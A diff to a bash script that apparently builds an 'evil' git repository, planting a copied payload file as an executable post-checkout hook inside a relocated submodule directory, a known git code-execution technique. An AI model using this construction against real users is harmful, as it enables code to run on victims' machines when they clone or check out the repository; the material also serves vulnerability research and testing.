@@ -1,5 +1,6 @@
 #!/bin/bash
 evil_submodule="zemodule"
+empty_submodule="https://github.com/pielgrzym/noop"
 
 rm -rf evil_git_repo
 
@@ -11,8 +12,8 @@ old_dir=$(pwd)
 cd $temp_repo
 export GIT_WORK_TREE=$temp_repo
 mkdir -p fakegit/modules
-git submodule add https://github.com/pielgrzym/noop $evil_submodule
-git submodule add https://github.com/pielgrzym/noop error
+git submodule add $empty_submodule $evil_submodule
+git submodule add $empty_submodule error
 mv .git/modules/$evil_submodule fakegit/modules/$evil_submodule
 cp $old_dir/payload.txt fakegit/modules/$evil_submodule/hooks/post-checkout
 chmod 755 fakegit/modules/$evil_submodule/hooks/post-checkout
